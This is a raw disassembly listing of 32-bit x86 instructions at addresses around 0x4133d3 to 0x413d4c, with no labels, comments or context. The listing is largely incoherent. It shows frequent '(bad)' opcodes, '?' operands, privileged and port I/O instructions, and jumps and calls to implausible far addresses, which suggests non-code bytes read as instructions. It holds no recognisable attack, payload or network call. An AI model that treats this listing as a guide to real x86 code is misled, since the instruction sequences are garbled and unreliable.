  4133d3:	jmp    FWORD PTR [edi+edx*1]
  4133d6:	cmp    eax,DWORD PTR [eax]
  4133d8:	pop    ebp
  4133d9:	std    
  4133da:	(bad)  
  4133db:	jnp    0x41343a
  4133dd:	cmp    ch,0x2
  4133e0:	cmp    al,0x1f
  4133e2:	jg     0x413460
  4133e4:	cld    
  4133e5:	xor    al,0xfe
  4133e7:	jl     0x413409
  4133e9:	std    
  4133ea:	jnp    0x4133f1
  4133ec:	xchg   ebx,eax
  4133ed:	cld    
  4133ee:	add    DWORD PTR [ebx+eiz*1-0x78],esi
  4133f2:	dec    edx
  4133f3:	and    al,0x28
  4133f5:	push   ebx
  4133f6:	dec    edi
  4133f7:	mov    eax,DWORD PTR [eax]
	...
  413409:	add    BYTE PTR [eax],al
  41340b:	add    BYTE PTR [esi-0x1b],al
  41340e:	int3   
  41340f:	repz inc edi
  413411:	cld    
  413412:	jmp    0x229acf47
  413417:	pop    eax
  413418:	pop    ebx
  413419:	inc    ecx
  41341a:	and    dl,BYTE PTR [eax]
  41341c:	imul   edx,eax,0x29
  41341f:	xlat   BYTE PTR ds:[ebx]
  413420:	mov    ds:0x39ce894c,al
  413425:	jmp    FWORD PTR [ebp-0x11]
  413428:	(bad)  
  413429:	or     DWORD PTR [ebx+eax*2],ebx
  41342c:	adc    eax,0x38ee7f37
  413431:	xchg   esp,eax
  413432:	and    al,0xea
  413434:	sub    ebx,DWORD PTR [esi-0x43b6dc4a]
  41343a:	(bad)  
  41343b:	dec    BYTE PTR [eax]
  41343d:	aad    0x8e
  41343f:	int    0x91
  413441:	xchg   esp,eax
  413442:	adc    edi,esi
  413444:	sahf   
  413445:	cmc    
  413446:	sbb    al,BYTE PTR [edx-0x70f6da6c]
  41344c:	mov    eax,0xb2000226
  413451:	mov    al,ds:0x273903ef
  413456:	scas   eax,DWORD PTR es:[edi]
  413457:	push   edx
  413458:	or     DWORD PTR [esi+0x774fe749],ebx
  41345e:	sbb    bh,dh
  413460:	mov    dl,0xea
  413462:	fbld   TBYTE PTR [edi]
  413464:	add    al,0xd8
  413466:	mov    cs,ebp
  413468:	ret    0x2b4e
  41346b:	out    dx,eax
  41346c:	dec    ebx
  41346d:	sbb    DWORD PTR [edx],0x3a
	...
  413483:	add    BYTE PTR [edx+0x19],bh
  413486:	jmp    0xbf3a:0xea4af58a
  41348d:	cmp    eax,0x352efffe
  413492:	or     eax,DWORD PTR [ebx-0xe19]
  413498:	cmp    DWORD PTR [ecx],ebp
  41349a:	mov    es,WORD PTR [esp+edx*2+0x29]
  41349e:	(bad)  
  41349f:	(bad)  
  4134a0:	cmp    DWORD PTR ds:0x2c0482ff,edi
  4134a6:	mov    es,WORD PTR [esi]
  4134a8:	cmp    al,0x29
  4134aa:	xchg   edi,eax
  4134ab:	push   esi
  4134ad:	gs aam 0x8a
  4134b0:	lea    eax,[eax]
  4134b2:	int    0xbb
  4134b4:	mov    cl,0xa4
  4134b6:	(bad)  
  4134b7:	out    dx,eax
  4134b8:	mov    ch,0x25
  4134ba:	pushf  
  4134bb:	jecxz  0x413480
  4134bd:	outs   dx,BYTE PTR ds:[esi]
  4134be:	hlt    
  4134bf:	dec    esi
  4134c1:	pop    ss
  4134c2:	cdq    
  4134c3:	mov    ch,0xb3
  4134c5:	inc    esi
  4134c6:	adc    ch,ah
  4134c8:	into   
  4134c9:	pop    ss
  4134ca:	cmc    
  4134cb:	pop    ebx
  4134cc:	cmp    DWORD PTR [eax],eax
  4134ce:	jmp    0xfcbf6cd6
  4134d3:	jmp    DWORD PTR [esi+0x5ac00f17]
  4134d9:	in     al,dx
  4134da:	pop    ebx
  4134db:	and    al,0xc5
  4134dd:	mov    ah,0xeb
  4134df:	sbb    ah,BYTE PTR [ebx+0x5ab771ba]
  4134e5:	mov    eax,0xbf71
	...
  4134fa:	add    BYTE PTR [eax],al
  4134fc:	pop    edx
  4134fd:	call   0x4704e91d
  413502:	rol    BYTE PTR [esi],0x6a
  413505:	pop    ss
  413506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413507:	add    al,0x97
  413509:	in     al,dx
  41350a:	in     al,0x3
  41350c:	cmp    DWORD PTR [ebp+0x2b57f934],eax
  413512:	retf   
  413513:	mov    ?,edx
  413515:	(bad)  [eax]
  413517:	add    DWORD PTR [edi-0x73],0xdbf28ed6
  41351e:	ror    BYTE PTR [esi+0x3e4ebcc],0x39
  413525:	mov    esp,edx
  413527:	fbld   TBYTE PTR [edx-0x77]
  41352a:	lods   al,BYTE PTR ds:[esi]
  41352b:	fbld   TBYTE PTR [esi-0x77]
  41352e:	mov    esp,0x41bf46df
  413533:	icebp  
  413534:	mov    ch,0x16
  413536:	mov    esp,0xed2b7e06
  41353b:	mov    ?,WORD PTR [ebx+ebp*8+0x3aecff]
  413542:	push   ebx
  413543:	cdq    
  413544:	mov    edi,0x135fe744
  413549:	push   ss
  41354a:	(bad)  
  41354b:	push   ds
  41354c:	mov    eax,0x3ae903f2
  413551:	jge    0x413551
  413553:	fimul  WORD PTR [esi+0x2a]
  413556:	(bad)  
  413557:	call   0xc5bd1096
  41355c:	out    0x5,al
  41355e:	test   DWORD PTR [eax],ecx
	...
  413574:	cmp    al,BYTE PTR [eax]
  413576:	add    BYTE PTR [edx-0x22],ah
  413579:	loop   0x4135ce
  41357b:	jb     0x41356d
  41357d:	jmp    0xa7aa24c
  413582:	cmp    ebp,DWORD PTR [esi-0x5974ff55]
  413588:	lds    ecx,FWORD PTR [ecx-0x7676f2bd]
  41358e:	jmp    0x8164:0x4fac5012
  413595:	loop   0x4135d2
  413597:	sbb    BYTE PTR [esp+eax*2-0x1da6ea78],bh
  41359e:	out    0x17,eax
  4135a0:	cs push ss
  4135a2:	(bad)  
  4135a3:	shr    BYTE PTR [esi+0x691b33e2],1
  4135a9:	mov    DWORD PTR [ebx-0x33],edx
  4135ac:	push   0xffffffad
  4135ae:	push   ecx
  4135af:	jb     0x4135a4
  4135b1:	push   ds
  4135b2:	out    0x78,al
  4135b4:	push   eax
  4135b5:	push   ss
  4135b6:	mov    al,BYTE PTR [ecx+0x2123c1bc]
  4135bc:	call   0x4d70c086
  4135c1:	sub    eax,0xda3056f0
  4135c6:	les    esp,FWORD PTR [edx-0x1f]
  4135c9:	loope  0x4135de
  4135cb:	add    dh,bh
  4135cd:	adc    DWORD PTR [ecx-0x76d3cbb4],ecx
  4135d3:	push   esp
  4135d4:	inc    esp
  4135d5:	xor    BYTE PTR [edi+0x4c],al
	...
  4135eb:	add    BYTE PTR [esp+esi*1],dh
  4135ee:	xchg   DWORD PTR [esp+esi*8+0x2d],edx
  4135f2:	mov    DWORD PTR [esp+esi*8+0x11],eax
  4135f6:	push   ebp
  4135f7:	push   ebp
  4135f8:	nop
  4135f9:	test   ah,cl
  4135fb:	call   0x3f2011
  413600:	dec    ebx
  413601:	dec    eax
  413602:	and    bh,BYTE PTR [eax]
  413604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413605:	push   edx
  413606:	mov    esi,ecx
  413608:	sbb    esp,esp
  41360a:	out    0xa3,al
  41360c:	mov    cl,0xf8
  41360e:	std    
  41360f:	cmp    edx,ebp
  413611:	outs   dx,BYTE PTR ds:[esi]
  413612:	cmp    BYTE PTR [ebx+0x3b362054],cl
  413618:	es xor eax,0x86a00002
  41361e:	pop    es
  41361f:	cmp    DWORD PTR [esi-0x6ffffdd7],0x1
  413626:	je     0x413640
  413628:	ins    DWORD PTR es:[edi],dx
  413629:	add    DWORD PTR ds:0x36d6000,eax
  41362f:	sbb    DWORD PTR [edi+0x7d1973fb],0x1
  413636:	jge    0x413638
  413638:	pusha  
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	add    eax,DWORD PTR [ebx+0xd73fcbf]
  413640:	daa    
  413641:	dec    esp
  413642:	mov    esi,ecx
  413644:	test   al,0xe4
  413646:	out    dx,eax
  413647:	jmp    FWORD PTR [edi+0xebfd2c]
  41364d:	test   BYTE PTR [edx+0x24],ch
	...
  413664:	and    BYTE PTR [esi],dl
  413666:	(bad)  
  413667:	call   DWORD PTR [eax]
  413669:	add    DWORD PTR [ebx+0x310239d3],ecx
  41366f:	push   ecx
  413670:	mov    fs:0xacfee748,al
  413676:	pop    ss
  413677:	(bad)  
  413678:	je     0x413624
  41367a:	daa    
  41367b:	add    BYTE PTR [esp+edi*4-0x77],ch
  41367f:	imul   edx,DWORD PTR ds:0x1d438b37,0x53
  413686:	ret    
  413687:	inc    edi
  413688:	mov    al,0x52
  41368a:	ficom  WORD PTR [edi+0x12]
  41368d:	iret   
  41368e:	pop    es
  41368f:	add    BYTE PTR [esi-0x4301e812],0xfd
  413696:	pop    es
  413697:	test   BYTE PTR [ebp-0x45fffdda],bl
  41369d:	or     eax,0xa9b70f00
  4136a2:	add    al,BYTE PTR [eax]
  4136a4:	cmp    DWORD PTR [edx-0x31b6dc39],edx
  4136aa:	mov    al,dl
  4136ac:	bound  esp,QWORD PTR [esi-0x4d]
  4136af:	push   eax
  4136b0:	ret    0x2b74
  4136b3:	cs xchg edi,eax
  4136b5:	cmp    eax,0xfae58a16
  4136ba:	fist   DWORD PTR [esi+0xb]
  4136bd:	mov    ds:0x3e618a45,al
  4136c2:	add    al,0xf1
  4136c4:	pop    bp
  4136c6:	fcmovb st,st(4)
	...
  4136dc:	(bad)  
  4136de:	mov    al,BYTE PTR [ebx+0x1d]
  4136e1:	das    
  4136e2:	fld    DWORD PTR [ebp+0x21b15]
  4136e8:	int3   
  4136e9:	jno    0x25c48ac
  4136ef:	add    BYTE PTR [ecx],bh
  4136f1:	adc    eax,0x1c393cfa
  4136f6:	add    al,BYTE PTR [eax]
  4136f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136f9:	add    ah,ch
  4136fb:	sbb    BYTE PTR [edi],0xff
  4136fe:	aam    0xdf
  413700:	push   ebp
  413701:	add    ah,dl
  413703:	add    edi,DWORD PTR [ecx]
  413705:	xchg   esp,eax
  413706:	jecxz  0x41368a
  413708:	pop    es
  413709:	add    BYTE PTR [ebp+0x71b067fb],bh
  41370f:	inc    esi
  413710:	fmulp  st(1),st
  413712:	aaa    
  413713:	pop    ss
  413714:	out    dx,eax
  413715:	daa    
  413716:	idiv   BYTE PTR [eax+0x4c69b383]
  41371c:	fbstp  TBYTE PTR [edx+0x3e0e4069]
  413722:	lock add eax,edx
  413725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413726:	(bad)  
  413727:	repz mov bl,0x3f
  41372a:	sar    DWORD PTR [esi],1
  41372c:	outs   dx,BYTE PTR ds:[esi]
  41372d:	lods   eax,DWORD PTR ds:[esi]
  41372e:	jno    0x413776
  413730:	sahf   
  413731:	repz push es
  413733:	pop    ss
  413734:	scas   eax,DWORD PTR es:[edi]
  413735:	mov    ebp,0x8d392769
  41373a:	shr    DWORD PTR [edx],cl
  41373c:	xchg   DWORD PTR cs:[eax+eiz*8],esi
	...
  413754:	inc    esi
  413755:	test   DWORD PTR [ecx],esp
  413757:	pop    ss
  413758:	jmp    0x9e86990a
  41375d:	sti    
  41375e:	(bad)  
  41375f:	push   ss
  413760:	jg     0x4136e9
  413762:	cmp    al,0xe0
  413764:	or     dl,BYTE PTR [ebp-0x19]
  413767:	add    edi,DWORD PTR [ecx]
  413769:	add    dl,dh
  41376b:	ss jmp 0x41374e
  41376e:	jae    0x4137ea
  413770:	pop    esi
  413771:	adc    ebp,eax
  413773:	add    eax,edx
  413775:	jp     0x413773
  413777:	dec    DWORD PTR [esi+0x13]
  41377a:	cmp    DWORD PTR [ebx+esi*4+0x4d209042],esi
  413781:	adc    edi,DWORD PTR [ebp+0x4]
  413784:	out    0xeb,eax
  413786:	(bad)  
  413787:	in     al,dx
  413788:	cmp    al,BYTE PTR [eax]
  41378a:	add    ecx,DWORD PTR [ebx+eax*1-0x44b38ece]
  413791:	inc    ebp
  413792:	(bad)  
  413793:	call   0xe9452f24
  413798:	cmp    al,BYTE PTR [ebp-0x8561fb6]
  41379e:	mov    ch,BYTE PTR [edi+0xa]
  4137a1:	(bad)  
  4137a2:	(bad)  
  4137a3:	call   0xed58b46d
  4137a8:	cmp    al,BYTE PTR [eax]
  4137aa:	inc    eax
  4137ab:	pusha  
  4137ac:	mov    esp,0x3ae903f6
  4137b1:	mov    DWORD PTR [ebp-0x1ed2907],eax
  4137b7:	bound  eax,QWORD PTR [eax]
	...
  4137c9:	add    BYTE PTR [eax],al
  4137cb:	add    BYTE PTR [ebx+ebp*8+0x3],cl
  4137cf:	jmp    0xeb50be0e
  4137d4:	or     BYTE PTR ds:0xffaa71c1,dl
  4137da:	popf   
  4137db:	aad    0xae
  4137dd:	adc    bh,dh
  4137df:	je     0x413786
  4137e1:	test   DWORD PTR [ebp-0x1ed6107],eax
  4137e7:	jo     0x413800
  4137e9:	jmp    0x4137ee
  4137eb:	jmp    0x5fc9f82a
  4137f0:	cmp    esi,0x7cb3e8ff
  4137f6:	pmulhw mm7,QWORD PTR [edx]
  4137f9:	add    BYTE PTR [ebx-0x19291],cl
  4137ff:	call   0xbb433ab4
  413804:	inc    edi
  413805:	inc    ecx
  413806:	xchg   ecx,edi
  413808:	cmp    esi,DWORD PTR [edx+0x1b]
  41380b:	in     eax,dx
  41380c:	cmp    al,BYTE PTR [eax]
  41380e:	jne    0x413800
  413810:	mov    cl,0x7c
  413812:	str    WORD PTR [esi+edi*8-0x1]
  413817:	mov    BYTE PTR [esi+0x20000214],bl
  41381d:	xchg   DWORD PTR ds:[esi-0x1ee0c],ecx
  413824:	test   eax,0x20040e92
  413829:	dec    BYTE PTR [edx-0x1edf77a]
  41382f:	inc    DWORD PTR [eax]
	...
  413841:	add    BYTE PTR [eax],al
  413843:	add    BYTE PTR [eax+0x1c],al
  413846:	mov    DWORD PTR [esi-0x1ee20],eax
  41384c:	push   ds
  41384d:	cld    
  41384e:	dec    DWORD PTR [edx+0x21856]
  413854:	ror    BYTE PTR [eax-0x233e77c],1
  41385a:	inc    DWORD PTR [eax]
  41385c:	xchg   BYTE PTR [edx+eax*1],cl
  41385f:	add    al,ah
  413861:	sub    bl,cl
  413863:	shl    al,cl
  413865:	mov    BYTE PTR [edx+0x24],al
  413868:	xchg   esp,eax
  413869:	xchg   edx,eax
  41386a:	mov    esi,0x4a88f174
  41386f:	and    al,0xc0
  413871:	mov    BYTE PTR [eax+edx*1+0x2afffd9c],dl
  413878:	pop    esp
  413879:	and    BYTE PTR [esi+0x51],cl
  41387c:	or     edi,DWORD PTR [ebx+0x12]
  41387f:	add    al,0xa0
  413881:	std    
  413882:	sub    cl,BYTE PTR [esp+edi*1+0x4c]
  413886:	push   eax
  413887:	push   ecx
  413888:	pop    ds
  413889:	jmp    0x413859
  41388b:	sbb    DWORD PTR [ebp+ecx*1+0x82dc083],0x5d
  413893:	mov    edx,DWORD PTR [ebx-0x2ca1a2a8]
  413899:	shl    BYTE PTR [esi],1
  41389b:	ret    0xfc38
  41389e:	mov    al,BYTE PTR [esi-0x1e8c7]
  4138a4:	inc    esi
  4138a5:	ds mov esi,0x23
	...
  4138bb:	add    cl,ch
  4138bd:	fstp   TBYTE PTR [eax+0x3ea6975e]
  4138c3:	aaa    
  4138c4:	sti    
  4138c5:	add    bh,BYTE PTR cs:[eax+0x82739]
  4138cc:	cli    
  4138cd:	lea    edi,[esi+0x4a8e3d23]
  4138d3:	shl    BYTE PTR [eax],0x26
  4138d6:	test   DWORD PTR [ebx+0x31],eax
  4138d9:	addr16 aas 
  4138db:	mov    dh,BYTE PTR [ebp+0x3]
  4138de:	or     BYTE PTR [ecx+0x2e5],al
  4138e4:	cmp    DWORD PTR [edx+eax*2+0x3ea83e74],esp
  4138eb:	sub    esi,DWORD PTR ds:0xc2c30227
  4138f1:	mov    ds:0x273543de,al
  4138f6:	add    cl,BYTE PTR [ebx+0x3c23aad]
  4138fc:	cmp    DWORD PTR [edi],esp
  4138fe:	mov    cl,0x8a
  413900:	lds    edi,FWORD PTR [edx]
  413902:	ret    0x3903
  413905:	daa    
  413906:	mov    al,0x8a
  413908:	int    0x3a
  41390a:	(bad)  
  41390b:	add    edi,DWORD PTR [ecx]
  41390d:	daa    
  41390e:	mov    bl,0x4f
  413910:	ret    0xe79a
  413913:	aas    
  413914:	xor    eax,0xe9520227
  413919:	mov    bl,0xbf
  41391b:	and    esp,DWORD PTR [ecx]
  41391d:	das    
  41391e:	mov    bl,0xf4
	...
  413934:	jbe    0x413987
  413936:	test   bl,al
  413938:	sbb    eax,0x7a000223
  41393d:	jb     0x41397e
  41393f:	retf   
  413940:	ins    DWORD PTR es:[edi],dx
  413941:	push   DWORD PTR [eax+eax*2+0x40ac4382]
  413948:	add    BYTE PTR [ebx+0x3b],0x7d
  41394c:	pop    ebp
  41394d:	jle    0x4139cb
  41394f:	adc    al,0x3e
  413951:	adc    al,ch
  413953:	mov    dh,0x8c
  413955:	mov    bh,0x71
  413957:	mov    ecx,0x391d136
  41395c:	out    dx,eax
  41395d:	push   ebx
  41395e:	mov    al,ds:0x700079c2
  413963:	adc    al,0xf9
  413965:	or     cl,ch
  413967:	add    al,bh
  413969:	add    al,0xf9
  41396b:	jl     0x413976
  41396d:	test   BYTE PTR [edi+0xb],al
  413970:	cs push edi
  413972:	je     0x413971
  413974:	mov    ?,WORD PTR [esi+0x38b403a7]
  41397a:	in     eax,0x78
  41397c:	or     DWORD PTR [eax],eax
  41397e:	ja     0x4139c5
  413980:	mov    dh,0xc4
  413982:	add    edi,DWORD PTR [ebx+edi*2]
  413985:	and    DWORD PTR [ecx],0xffffffcc
  413988:	push   edx
  413989:	xor    edi,edx
  41398b:	xor    eax,0xff8b835c
  413990:	cmp    DWORD PTR [ebp+0x17867cf2],edx
  413996:	and    BYTE PTR [ecx+0x0],al
	...
  4139ac:	add    al,BYTE PTR [eax]
  4139ae:	xlat   BYTE PTR ds:[ebx]
  4139af:	push   ds
  4139b0:	cmp    edi,DWORD PTR [ebp-0x24]
  4139b3:	cmc    
  4139b4:	lods   eax,DWORD PTR ds:[esi]
  4139b5:	mov    edi,esp
  4139b7:	xchg   dl,bl
  4139b9:	dec    ebp
  4139ba:	clc    
  4139bb:	adc    cl,BYTE PTR [edi-0x257917f1]
  4139c1:	jge    0x4139bb
  4139c3:	adc    bh,BYTE PTR [edi+0xf]
  4139c6:	call   0x7740cd9f
  4139cb:	test   DWORD PTR [esi-0x42],ebp
  4139ce:	jmp    DWORD PTR [edi]
  4139d0:	cmp    eax,0xb7d1337d
  4139d5:	or     eax,0x7957241b
  4139da:	inc    ebx
  4139db:	aam    0x12
  4139dd:	xchg   DWORD PTR [ebx-0xc],eax
  4139e0:	retf   0x719
  4139e3:	arpl   WORD PTR [esi-0x2c],si
  4139e6:	stos   DWORD PTR es:[edi],eax
  4139e7:	jno    0x4139e7
  4139e9:	jmp    0x41397a
  4139eb:	sub    dh,BYTE PTR [esi+0x55f51b09]
  4139f1:	dec    edx
  4139f2:	sbb    ebp,ecx
  4139f4:	cmp    al,BYTE PTR [eax]
  4139f6:	setg   BYTE PTR [esi+ecx*1+0x7d3aa84d]
  4139fe:	xor    esi,ecx
  413a00:	mov    edi,0xfccc370c
  413a05:	js     0x413a4a
  413a07:	cld    
  413a08:	xor    al,BYTE PTR [edi+0x1a6adc43]
  413a0e:	pop    es
  413a0f:	arpl   WORD PTR [eax],ax
	...
  413a21:	add    BYTE PTR [eax],al
  413a23:	add    dh,bh
  413a25:	shr    DWORD PTR [ebx-0x7014099f],cl
  413a2b:	stos   BYTE PTR es:[edi],al
  413a2c:	mov    edi,0x1d9d3709
  413a31:	rcr    dl,1
  413a33:	out    0x60,al
  413a35:	or     BYTE PTR [edi],0x9e
  413a38:	cmc    
  413a39:	push   cs
  413a3a:	jle    0x4139c1
  413a3c:	inc    ecx
  413a3d:	jo     0x413a3e
  413a3f:	je     0x413a79
  413a41:	jnp    0x413a46
  413a43:	push   esp
  413a44:	ret    0x40bc
  413a47:	jmp    0xf9cdbce9
  413a4c:	sub    DWORD PTR [esi],ecx
  413a4e:	(bad)  
  413a4f:	out    dx,al
  413a50:	lock and DWORD PTR [edi],0x7e0e7a26
  413a57:	dec    ebp
  413a58:	ss jo  0x413a5a
  413a5b:	push   DWORD PTR [edx+eax*1]
  413a5e:	mov    eax,DWORD PTR [ecx*1+0x50414c6c]
  413a65:	or     DWORD PTR [edx-0x2107f43],eax
  413a6b:	jmp    DWORD PTR [ebx]
  413a6d:	test   ecx,edi
  413a6f:	sbb    BYTE PTR [esi+eax*8],ch
  413a72:	inc    eax
  413a73:	sub    DWORD PTR [edx+0x6a8c0d13],0xffffffef
  413a7a:	std    
  413a7b:	jmp    FWORD PTR [ebp-0x5000f17b]
  413a81:	out    dx,eax
  413a82:	dec    esi
  413a83:	call   0x413ca1
	...
  413a9c:	das    
  413a9d:	push   edx
  413a9e:	pop    ecx
  413a9f:	mov    DWORD PTR [ebp+ebx*2-0x40],ebp
  413aa3:	or     BYTE PTR [eax],ah
  413aa5:	push   edi
  413aa6:	xchg   ebp,esp
  413aa8:	xchg   ecx,eax
  413aa9:	loopne 0x413b29
  413aab:	add    BYTE PTR [eax],dl
  413aad:	add    dl,BYTE PTR [ebx+0x56]
  413ab0:	xlat   BYTE PTR ds:[ebx]
  413ab1:	mov    WORD PTR [ebx+0x8],es
  413ab4:	pop    ebp
  413ab5:	push   ebp
  413ab6:	jle    0x413a71
  413ab8:	add    BYTE PTR [edx],al
  413aba:	add    BYTE PTR [eax],al
  413abc:	pop    ecx
  413abd:	ret    
  413abe:	add    eax,0x81318ce4
  413ac4:	ss add al,0x0
  413ac7:	cld    
  413ac8:	rol    dl,1
  413aca:	in     al,0x6
  413acc:	pop    ebx
  413acd:	cmp    edi,DWORD PTR [edi-0x19]
  413ad0:	pusha  
  413ad1:	(bad)  
  413ad2:	(bad)  
  413ad3:	jmp    DWORD PTR [ecx-0x29]
  413ad6:	or     BYTE PTR [ecx],cl
  413ad8:	scas   al,BYTE PTR es:[edi]
  413ad9:	mov    WORD PTR [esi],?
  413adb:	xor    DWORD PTR [edi],0xa0fc0004
  413ae1:	ret    0xaed
  413ae4:	mov    edi,ebp
  413ae6:	xchg   DWORD PTR [edx],esi
  413ae8:	cmp    DWORD PTR [eax+0x237b8238],esp
  413aee:	jnp    0x413b27
  413af0:	mov    eax,0x390e423e
  413af5:	pop    ss
  413af6:	inc    ecx
  413af7:	out    dx,al
  413af8:	aas    
  413af9:	and    dl,al
  413afb:	mov    BYTE PTR [edi],bl
  413afd:	mov    ds:0x80d3,al
	...
  413b12:	add    BYTE PTR [eax],al
  413b14:	pop    edi
  413b15:	pop    ss
  413b16:	adc    al,BYTE PTR [edx]
  413b18:	cmp    DWORD PTR [eax+0x28],ebx
  413b1b:	or     esi,DWORD PTR [edx-0x11d7cee]
  413b21:	push   edi
  413b22:	and    ecx,DWORD PTR [edi]
  413b24:	inc    eax
  413b25:	gs jnp 0x413b3f
  413b28:	mov    eax,0x3af00279
  413b2d:	pop    ss
  413b2e:	inc    ecx
  413b2f:	jmp    0x904b:0x88302035
  413b36:	xor    eax,DWORD PTR [edx+0x2f7b22fb]
  413b3c:	mov    edx,0x4a0acfbc
  413b41:	mov    al,ds:0xd6ba48d3
  413b46:	push   es
  413b47:	test   DWORD PTR [eax],eax
  413b49:	push   esp
  413b4a:	mov    BYTE PTR [esp+edi*2+0x16e7b297],cl
  413b51:	pop    ss
  413b52:	add    al,BYTE PTR [eax]
  413b54:	jbe    0x413b9b
  413b56:	stos   DWORD PTR es:[edi],eax
  413b57:	mov    ch,bl
  413b59:	dec    ebx
  413b5a:	inc    esp
  413b5b:	add    edi,DWORD PTR [ecx]
  413b5d:	mov    ds:0xb13523c6,al
  413b62:	inc    edx
  413b63:	dec    ebx
  413b64:	clc    
  413b65:	push   ss
  413b66:	jnp    0x413b71
  413b68:	ror    BYTE PTR [esi],0x83
  413b6b:	sar    DWORD PTR ds:0xb803429a,0x10
  413b72:	ror    DWORD PTR [eax+edi*8-0x1],0xe8
  413b77:	xchg   ecx,eax
	...
  413b8c:	pushf  
  413b8d:	inc    ecx
  413b8e:	in     al,0x3
  413b90:	mov    dl,0xc3
  413b92:	or     al,0x8
  413b94:	ret    
  413b95:	aas    
  413b96:	sbb    al,0xc5
  413b98:	jbe    0x413c13
  413b9a:	lock jl 0x413bdd
  413b9d:	sub    DWORD PTR [eax-0x13be45f8],0x1bbf6084
  413ba7:	lds    edx,FWORD PTR [esi-0x72]
  413baa:	xchg   esi,eax
  413bab:	inc    edx
  413bac:	cmp    al,BYTE PTR [eax]
  413bae:	xor    al,0x7d
  413bb0:	pop    ebp
  413bb1:	scas   eax,DWORD PTR es:[edi]
  413bb2:	cmp    BYTE PTR [ebx+0x7ae0c2b3],dh
  413bb8:	xchg   ebp,eax
  413bb9:	cld    
  413bba:	jae    0x413b75
  413bbc:	es scas eax,DWORD PTR es:[edi]
  413bbe:	sbb    BYTE PTR [edi+eax*2],bl
  413bc1:	add    cl,ch
  413bc3:	add    edx,DWORD PTR [ecx+0x16c51c40]
  413bc9:	jge    0x413b76
  413bcb:	or     edi,DWORD PTR [esi+0x18]
  413bce:	das    
  413bcf:	add    al,0x39
  413bd1:	add    BYTE PTR [edx-0x47f78a80],bh
  413bd7:	sbb    esp,DWORD PTR [esi+0x0]
  413bda:	jmp    0x4cbacde2
  413bdf:	mov    cl,0xf8
  413be1:	clc    
  413be2:	call   0x505ef99
  413be7:	cld    
  413be8:	ret    
  413be9:	mov    ah,0xcc
  413beb:	inc    ecx
  413bed:	inc    ecx
  413bee:	test   al,0xfe
	...
  413c04:	mov    ecx,?
  413c06:	daa    
  413c07:	and    eax,0x7ce27926
  413c0c:	jns    0x413bce
  413c0e:	cmc    
  413c0f:	push   ebp
  413c10:	inc    ecx
  413c11:	inc    ecx
  413c12:	pop    es
  413c13:	hlt    
  413c14:	xor    esi,esi
  413c16:	call   FWORD PTR [edi-0x5d]
  413c19:	js     0x413bdb
  413c1b:	test   eax,0xa8085597
  413c20:	push   ebp
  413c21:	add    ecx,DWORD PTR [ebx]
  413c23:	repz add eax,0xbbb888f9
  413c29:	inc    ecx
  413c2a:	add    esp,DWORD PTR [eax-0x5]
  413c2d:	retf   0x7f0e
  413c30:	arpl   ax,di
  413c32:	sbb    BYTE PTR [eax-0x3],dh
  413c35:	retf   0x7f0e
  413c38:	pop    ebp
  413c39:	inc    eax
  413c3a:	loopne 0x413c0d
  413c3c:	aad    0xf8
  413c3e:	mov    BYTE PTR [eax-0xf4a0586],ch
  413c44:	std    
  413c45:	pop    ds
  413c46:	psrad  mm0,QWORD PTR [eax+0x78]
  413c4a:	or     DWORD PTR [eax+0x7d],esp
  413c4d:	retf   
  413c4e:	push   cs
  413c4f:	aas    
  413c50:	sub    eax,0x23f1e040
  413c55:	stc    
  413c56:	push   cs
  413c57:	aas    
  413c58:	cmp    bh,cl
  413c5a:	shl    BYTE PTR [eax+0x10],0xa6
  413c5e:	shl    ecx,0x3a
  413c61:	scas   eax,DWORD PTR es:[edi]
  413c62:	mov    dh,BYTE PTR [ebp-0x5a74fce2]
	...
  413c7c:	push   ss
  413c7d:	test   DWORD PTR [edx+0x17237deb],0x8ac13571
  413c87:	jmp    0x413d06
  413c89:	and    ecx,DWORD PTR [edi]
  413c8b:	popa   
  413c8c:	xor    eax,0x7deb8ac1
  413c91:	and    eax,DWORD PTR [edi]
  413c93:	jno    0x413cca
  413c95:	ror    DWORD PTR [eax-0x308802ce],0x6a
  413c9c:	js     0x413c9d
  413c9e:	mov    ch,cl
  413ca0:	xor    bh,dh
  413ca2:	mov    al,BYTE PTR [eax]
  413ca4:	mov    ds:0x2818e6c3,al
  413ca9:	add    al,0x41
  413cab:	mov    edx,DWORD PTR [edx+0x1810e6c3]
  413cb1:	add    al,0x41
  413cb3:	mov    esp,DWORD PTR [edx+0x808e6bd]
  413cb9:	inc    DWORD PTR [eax-0x75]
  413cbc:	add    BYTE PTR [esi+0x576188ce],0xc0
  413cc3:	or     BYTE PTR [eax+0x51],ah
  413cc6:	xchg   ebp,esp
  413cc8:	rcr    edi,cl
  413cca:	or     dl,BYTE PTR [ebx+0x3e]
  413ccd:	push   ebp
  413cce:	mov    DWORD PTR [ebp+0x74],eax
  413cd1:	xchg   DWORD PTR [ebx+0x8],edx
  413cd4:	retf   
  413cd5:	or     eax,0x87484d89
  413cda:	inc    edi
  413cdb:	add    al,0xd9
  413cdd:	sar    BYTE PTR [edi+0xeb],1
	...
  413cf3:	add    BYTE PTR [edi+ebp*1],bl
  413cf6:	leave  
  413cf7:	add    ebx,0x170f0d0b
  413cfd:	das    
  413cfe:	xlat   BYTE PTR ds:[ebx]
  413cff:	mov    esi,eax
  413d01:	mov    ebp,0xefd104e4
  413d06:	xchg   esi,edx
  413d08:	popa   
  413d09:	jmp    0x81f1:0x8556310e
  413d10:	jae    0x413d0d
  413d12:	std    
  413d13:	add    al,ah
  413d15:	xlat   BYTE PTR cs:[ebx]
  413d17:	mov    DWORD PTR [esi],edx
  413d19:	mov    ebp,0xefe110e4
  413d1e:	xchg   esi,ecx
  413d20:	adc    edx,ebp
  413d22:	add    BYTE PTR [ecx],dh
  413d24:	cs test ecx,esi
  413d27:	add    DWORD PTR [ebx+0x2f],0x2ee33331
  413d2e:	fmul   DWORD PTR [ecx-0x1abd2ec7]
  413d34:	cmp    ebp,DWORD PTR [eax]
  413d36:	adc    DWORD PTR [eax+0x71dd87f],ecx
  413d3c:	push   0xb8f27af1
  413d41:	test   BYTE PTR [edi+edi*8],0x97
  413d45:	pop    ss
  413d46:	rcr    ecx,1
  413d48:	rol    BYTE PTR [ecx+0x41],0xe5
  413d4c:	xor    eax,ebp
